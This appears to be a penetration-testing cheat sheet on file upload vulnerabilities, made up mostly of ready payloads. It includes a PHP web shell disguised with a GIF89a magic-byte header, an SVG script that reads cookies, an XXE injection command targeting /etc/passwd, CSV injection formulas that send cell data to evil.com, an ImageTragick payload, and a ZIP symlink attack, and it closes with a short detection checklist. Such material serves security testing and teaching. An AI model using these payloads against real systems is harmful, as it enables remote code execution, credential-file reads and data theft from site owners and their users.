# File Upload Vulnerabilities: Beyond Shell Uploads

## Bypassing Extension Filters

### Blacklist Bypass
```bash
# Double extension
file.php.jpg, file.php5, file.phtml, file.pht
# Case variation
file.PhP, file.ASP, file.JSP
# Trailing characters
file.php., file.php , file.php%00.jpg (null byte)
# Apache-specific
file.php%0a (newline in extension)
file.php;.jpg (parameter in filename)
.htaccess (override Apache config)
```

### Content-Type Bypass
```http
Content-Type: image/jpeg
# Even if extension is .php, some parsers only check MIME
```

### Magic Byte Bypass
```bash
# Files beginning with GIF89a are valid GIFs regardless of extension
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php.gif
# Upload works, then access via /uploads/shell.php.gif
```

## SVG Upload XSS
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>alert(document.cookie)</script>
</svg>
```

## Office Document XXE

Upload an XLSX/DOCX that contains XXE payloads:

```bash
# Use XXElixir to inject XXE into Office files
python3 XXElixir.py --file template.xlsx --xxe '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' --output poisoned.xlsx
```

## File Content-Based Attacks

### CSV Injection
```csv
=CMD('/C calc')
@SUM(1+1)*cmd|' /C calc'!A0
+IMPORTXML(CONCATENATE("https://evil.com/?data=",A1),"//*")
```

### PDF Upload SSRF
```bash
# Craft PDF with embedded URL fetch
# Some PDF processors resolve external references
```

## Server-Side Processing Vulnerabilities

```bash
# ImageMagick RCE (ImageTragick)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://evil.com/test.jpg)'
pop graphic-context
# FFmpeg SSRF (via malicious HLS playlist or subtitle file)
```

## ZIP Symlink Attack

```bash
# Create ZIP containing symlink to /etc/passwd
ln -s /etc/passwd symlink_target
zip --symlinks evil.zip symlink_target
# Upload → server extracts → can read /etc/passwd via the symlink
```

## Detection Checklist

1. Can you upload non-image files by changing extension?
2. Is the upload stored inside web root? (Find the URL)
3. Is the filename user-controlled before storage?
4. Are uploaded files served with Content-Disposition: attachment?
5. Is there a file size limit? (Large uploads may not be validated for content)
6. Is there a virus scanner? (It may have bypasses)
7. Does the app re-encode/render uploaded media? (ImageMagick/FFmpeg bugs)
